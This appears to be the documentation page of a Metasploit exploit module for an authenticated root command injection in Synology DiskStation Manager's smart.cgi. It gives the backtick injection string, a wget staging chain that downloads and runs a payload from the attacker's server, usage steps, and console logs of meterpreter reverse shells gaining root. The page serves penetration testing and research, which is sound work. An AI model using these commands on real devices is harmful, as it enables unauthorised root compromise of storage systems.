{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/synology_dsm_smart_exec_auth","result":{"data":{"moduleMetadataJson":{"id":"3b4d3414-716a-5465-9c39-6a332bed8887","name":"Synology DiskStation Manager smart.cgi Remote Command Execution","fullname":"exploit/linux/http/synology_dsm_smart_exec_auth","description":"This module exploits a vulnerability found in Synology DiskStation Manager (DSM)\n          versions < 5.2-5967-5, which allows the execution of arbitrary commands under root\n          privileges after website authentication.\n          The vulnerability is located in webman/modules/StorageManager/smart.cgi, which\n          allows appending of a command to the device to be scanned.  However, the command\n          with drive is limited to 30 characters.  A somewhat valid drive name is required,\n          thus /dev/sd is used, even though it doesn't exist.  To circumvent the character\n          restriction, a wget input file is staged in /a, and executed to download our payload\n          to /b.  From there the payload is executed.  A wfsdelay is required to give time\n          for the payload to download, and the execution of it to run.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/synology_dsm_smart_exec_auth","documentationSlug":"/modules/documentation/exploit/linux/http/synology_dsm_smart_exec_auth","referencesSlug":"/modules/references/exploit/linux/http/synology_dsm_smart_exec_auth"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a vulnerability found in Synology DiskStation Manager (DSM)\nversions &#x3C; 5.2-5967-5, which allows the execution of arbitrary commands under root\nprivileges after website authentication.</p>\n<p>The vulnerability is located in <code class=\"language-text\">webman/modules/StorageManager/smart.cgi</code>, which\nallows appending of a command to the device to be scanned.  However, the command\nwith drive is limited to 30 characters.  A somewhat valid drive name is required,\nthus /dev/sd is used, even though it doesn't exist.  To circumvent the character\nrestriction, a wget input file is staged in /a, and executed to download our payload\nto /b.  From there the payload is executed.  A wfsdelay is required to give time\nfor the payload to download, and the execution of it to run.</p>\n<p>A more detailed explination of exploitation steps:</p>\n<ol>\n<li>We first clean the env by deleting <code class=\"language-text\">/a</code>, and <code class=\"language-text\">b</code></li>\n<li>we use <code class=\"language-text\">echo -n</code> to append our IP:PORT for our staging server to <code class=\"language-text\">/a</code>.  This is\ndone in small chunks to stay under the character limit.</li>\n<li>we call <code class=\"language-text\">wget -i /a -O b</code> to write our payload to <code class=\"language-text\">b</code> in <code class=\"language-text\">/usr/syno/synoman/webman/modules/StorageManager</code></li>\n<li>we wait for HTTP Server to receive the <code class=\"language-text\">wget</code> request and send back the payload.  Then we execute it.</li>\n</ol>\n<h3 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h3>\n<p><code class=\"language-text\">smart.cgi</code> and our payload are located in <code class=\"language-text\">/usr/syno/synoman/webman/modules/StorageManager</code>.</p>\n<p><code class=\"language-text\">/var/log/messages</code> will contain logs of exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">May 19 16:35:50 oldNas smart.cgi: smart.cpp:477 smartctl system command failed cmd: /usr/syno/bin/smartctl -d sat -t short /dev/sd`wget -i /a -O b` &gt; /dev/null 2&gt;&amp;1 ret: 4\nMay 19 16:35:50 oldNas smart.cgi: smart.cpp:846 error</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>No randomization was chosen on the <code class=\"language-text\">a</code> and <code class=\"language-text\">b</code> file names since we're so limited on characters as it is.\nWhile it would be possible to randomize a single character, it didn't seem worth the effort.</p>\n<h3 id=\"device-downgrade\" style=\"position:relative;\"><a href=\"#device-downgrade\" aria-label=\"device downgrade permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Device Downgrade</h3>\n<p>The vulnerable DSM can be downloaded from <a href=\"https://archive.synology.com/download/DSM/release/5.2/5644/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Synology</a></p>\n<p>Essentially Synology doesn't want you to downgrade. In order to do so, we need to mount the recovery boot loader\nand overwrite it with synology 5.2.  Then when we cause an issue (by removing the disks on boot), it will boot\nto the recovery.  Since the recovery is 5.2, it will let us install the 'current' version of 5.2.</p>\n<p>You'll want to watch <a href=\"https://youtube.com/watch?v=DFtOmEv63n4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Downgrade DSM6.x to DSM 5.2</a></p>\n<p>The notes from the video are:</p>\n<ol>\n<li>Turn on synology and backup data if needed.</li>\n<li>Create a shared folder. (\"test\" is used in this guide)</li>\n<li>Locally, extract 4 files from DSM 5644.pat (grub_cksum.syno, rd.gz, zImage, checksum.syno)\nand place the files in the newly created shared folder on the NAS.</li>\n<li>Enable telnet/ssh in the DSM control panel.</li>\n<li>telnet/ssh to the diskstation.</li>\n<li>Log in as admin.</li>\n<li>Type <code class=\"language-text\">sudo su</code>. The password it asks for will also be the admins password.</li>\n<li>Type <code class=\"language-text\">cd /dev</code> to change to the devices directory.</li>\n<li>Type <code class=\"language-text\">ls synoboot2</code> to make sure synoboot2 is listed.</li>\n<li>Type <code class=\"language-text\">mkdir /mnt/synoboot</code> to make a directory to mount to.</li>\n<li>Type <code class=\"language-text\">mount synoboot2 /mnt/synoboot</code> to mount the boot files to the directory we created.</li>\n<li>Type <code class=\"language-text\">cd /mnt/synoboot</code> to change to that directory.</li>\n<li>Type <code class=\"language-text\">ls</code> to view the files in the directory.\n(note that the names of the 4 files we put in the shared folder, should be there.\nAlthough these ones listed are the DSM6 versions)</li>\n<li>Type <code class=\"language-text\">cp /volume1/test/checksum.syno /mnt/synoboot</code>.</li>\n<li>Type <code class=\"language-text\">cp /volume1/test/grub_cksum.syno /mnt/synoboot</code>.</li>\n<li>Type <code class=\"language-text\">cp /volume1/test/rd.gz /mnt/synoboot</code>.</li>\n<li>Type <code class=\"language-text\">cp /volume1/test/zImage /mnt/synoboot</code>.</li>\n<li>Go back into the DSM interface and shutdown. Once the device is shutdown, remove the disks.\n(This step is important because if you do not remove the disks,\nthe next powerup will detect an issue and recover the DSM6 boot image)</li>\n<li>Power the device up. Should say no disks inserted.\nBefore clicking the connect again button, put the hard disks back in and wait for the HDD LED's to light up.</li>\n<li>If disks are in, click the connect again button.\nNext page should come up saying to reinstall DSM.\nMake sure to choose the 5967 pat file so that the bootimage is overwritten correctly.</li>\n<li>Good to go! Data should remain intact as long as it is in a shared folder,\nand DSM should be a completely stock 5.2 - 5967.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the 5.2 vulnerable DSM</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/synology_dsm_smart_exec_auth</code></li>\n<li>Do: <code class=\"language-text\">set username &lt;username&gt;</code></li>\n<li>Do: <code class=\"language-text\">set password &lt;password&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a root shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"password\" style=\"position:relative;\"><a href=\"#password\" aria-label=\"password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Password</h3>\n<p>Password for website login.  Default is <code class=\"language-text\">password</code>.</p>\n<h3 id=\"username\" style=\"position:relative;\"><a href=\"#username\" aria-label=\"username permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Username</h3>\n<p>Username for website login.  Default is <code class=\"language-text\">admin</code>.</p>\n<h3 id=\"wfsdelay\" style=\"position:relative;\"><a href=\"#wfsdelay\" aria-label=\"wfsdelay permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>wfsdelay</h3>\n<p>Wfsdelay needs to be at least a couple seconds to allow for payload download and staging.  Default is <code class=\"language-text\">10</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ds412-with-dsm-52-5644\" style=\"position:relative;\"><a href=\"#ds412-with-dsm-52-5644\" aria-label=\"ds412 with dsm 52 5644 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DS412+ with DSM 5.2-5644</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing synology.rc for ERB directives.\nresource (synology.rc)&gt; use modules/exploits/linux/http/synology_dsm_smart_exec_auth\nresource (synology.rc)&gt; set payload python/meterpreter/reverse_tcp\npayload =&gt; python/meterpreter/reverse_tcp\nresource (synology.rc)&gt; set rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nresource (synology.rc)&gt; set lport 60111\nlport =&gt; 60111\nresource (synology.rc)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (synology.rc)&gt; set srvhost 1.1.1.1\nsrvhost =&gt; 1.1.1.1\nresource (synology.rc)&gt; set username admin\nusername =&gt; admin\nresource (synology.rc)&gt; set password password\npassword =&gt; password\nresource (synology.rc)&gt; set verbose true\nverbose =&gt; true\nresource (synology.rc)&gt; rexploit\n[*] Reloading module...\n[*] Started reverse TCP handler on 1.1.1.1:60111 \n[*] Trying to detect installed version\n[*] Model DS412+ with version 5.2-5644 detected\n[*] Attempting Login\n[*] Using URL: http://1.1.1.1:8080/\n[*] Cleaning env\n[*] Staging wget with: echo -n &#39;1.1&#39;&gt;&gt;/a\n[*] Staging wget with: echo -n &#39;.1.1:&#39;&gt;&gt;/a\n[*] Staging wget with: echo -n &#39;8080&#39;&gt;&gt;/a\n[*] Requesting payload pull\n[+] HTTP Server request received, sending payload\n[*] Executing payload\n[*] Sending stage (53755 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:60111 -&gt; 2.2.2.2:42353) at 2020-05-19 20:13:33 -0400\n[*] Server stopped.\n[!] This exploit may require manual cleanup of &#39;/usr/syno/synoman/webman/modules/StorageManager/b&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/a&#39; on the target\n\nmeterpreter &gt; \n[+] Deleted /usr/syno/synoman/webman/modules/StorageManager/b\n[+] Deleted /a\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; sysinfo\nComputer     : oldNas\nOS           : Linux 3.10.35 #5644 SMP Thu Nov 12 17:18:22 CST 2015\nArchitecture : x64\nMeterpreter  : python/linux\nmeterpreter &gt; cat /etc.defaults/VERSION\nmajorversion=&quot;5&quot;\nminorversion=&quot;2&quot;\nbuildphase=&quot;hotfix&quot;\nbuildnumber=&quot;5644&quot;\nsmallfixnumber=&quot;0&quot;\nbuilddate=&quot;2015/11/12&quot;\nbuildtime=&quot;17:17:21&quot;\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ds410-with-dsm-52-5644\" style=\"position:relative;\"><a href=\"#ds410-with-dsm-52-5644\" aria-label=\"ds410 with dsm 52 5644 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DS410 with DSM 5.2-5644</h3>\n<p>This unit's version was not able to be determined automatically.  <code class=\"language-text\">forceexploit</code> was set to <code class=\"language-text\">true</code> to enable it to run.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/synology_dsm_smart_exec_auth) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.168:4567 \n[*] Trying to detect installed version\n[*] Attempting Login\n[*] Using URL: http://192.168.135.168:8080/\n[*] Cleaning env\n[*] Staging wget with: echo -n &#39;192.168&#39;&gt;&gt;/a\n[*] Staging wget with: echo -n &#39;.135.16&#39;&gt;&gt;/a\n[*] Staging wget with: echo -n &#39;8:8080&#39;&gt;&gt;/a\n[*] Requesting payload pull\n[+] HTTP Server request received, sending payload\n[*] Executing payload\n[*] Sending stage (53755 bytes) to 192.168.132.107\n[*] Meterpreter session 1 opened (192.168.135.168:4567 -&gt; 192.168.132.107:54951) at 2020-05-20 13:53:18 -0500\n[*] Server stopped.\n[!] This exploit may require manual cleanup of &#39;/usr/syno/synoman/webman/modules/StorageManager/b&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/a&#39; on the target\n\nmeterpreter &gt; \n[+] Deleted /usr/syno/synoman/webman/modules/StorageManager/b\n[+] Deleted /a\n\nmeterpreter &gt; sysinfo\nComputer     : DiskStation\nOS           : Linux 2.6.32.12 #5644 Thu Nov 12 17:17:40 CST 2015\nArchitecture : ppc\nMeterpreter  : python/linux\nmeterpreter &gt; exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3b4d3414-716a-5465-9c39-6a332bed8887"}}}